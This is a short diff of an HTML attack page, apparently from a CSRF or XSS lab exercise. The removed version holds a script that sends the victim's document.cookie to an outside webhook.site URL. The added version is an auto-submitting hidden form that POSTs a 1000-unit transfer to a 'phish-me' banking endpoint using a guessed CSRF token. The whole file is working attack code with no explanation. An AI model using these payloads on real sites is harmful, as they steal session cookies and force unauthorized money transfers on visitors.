@@ -1,7 +1,11 @@
 <html>
-<body>
-<script>
-new Image().src="https://webhook.site/1e8a9501-5eaa-4bca-8312-3c9d9eef24b9?c="+document.cookie;
-</script>
+<body onload="document.forms[0].submit()">
+
+<form action="https://phish-me.quoccacorp.com/api/transfer" method="POST">
+    <input type="hidden" name="csrf_token" value="NTg2NA==">
+    <input type="hidden" name="username" value="YOUR_USERNAME">
+    <input type="hidden" name="amount" value="1000">
+</form>
+
 </body>
 </html>
